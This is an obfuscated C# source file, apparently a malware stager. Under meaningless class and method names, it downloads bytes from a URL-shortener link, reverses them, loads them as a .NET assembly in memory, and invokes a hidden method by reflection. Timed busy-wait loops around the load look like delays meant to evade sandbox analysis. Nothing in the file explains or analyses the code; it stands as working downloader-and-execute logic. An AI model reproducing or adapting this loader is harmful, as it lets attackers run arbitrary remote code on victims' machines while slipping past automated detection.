using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;

internal class odfn
{
	private odfo megt = default(odfo);

	internal byte[] lful()
	{
		return lfum(lfun("https://tiny.one/4btvcuz5"));
	}

	internal byte[] lfum(byte[] vyyl)
	{
		Dictionary<int, byte> dictionary = new Dictionary<int, byte>();
		int num = vyyl.Length;
		while (num-- > 0)
		{
			dictionary.Add(num, vyyl[num]);
		}
		return dictionary.Values.ToArray();
	}

	private static byte[] lfun(string vyyl)
	{
		using WebClient webClient = new WebClient();
		return webClient.DownloadData(vyyl);
	}

	internal void lfuo()
	{
		try
		{
			DateTime dateTime = DateTime.Now.AddSeconds(9.0);
			while (DateTime.Now < dateTime)
			{
			}
		}
		catch
		{
		}
		megt.wwob = Assembly.Load(lful());
		try
		{
			DateTime dateTime2 = DateTime.Now.AddSeconds(10.0);
			while (DateTime.Now < dateTime2)
			{
			}
		}
		catch
		{
		}
	}

	internal void lfup()
	{
		megt.wwoc = megt.wwob.GetType("Iwpvgtuqglunuwkxzthnqjvi.Uhbkxtkhxbhqufdkdwgpxsg")!.GetMethod("Xynyqov");
	}

	internal void lfuq()
	{
		Delegate.CreateDelegate(typeof(Action), megt.wwoc).DynamicInvoke();
	}
}
